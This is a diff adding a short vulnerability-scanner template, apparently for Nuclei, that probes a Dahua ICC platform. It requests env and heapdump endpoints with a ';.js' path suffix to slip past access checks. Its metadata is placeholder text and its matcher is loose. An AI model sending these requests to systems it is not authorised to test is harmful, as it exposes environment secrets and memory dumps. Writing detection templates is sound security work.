@@ -1,0 +1,22 @@
+id: dahua-icc-dsc-mac-weak
+
+info:
+  name: dahua-icc-dsc-mac-weak
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/evo-apigw/dsc-mac/env;.js"
+      - "{{BaseURL}}/evo-apigw/dsc-mac/heapdump;.js"
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 200
+
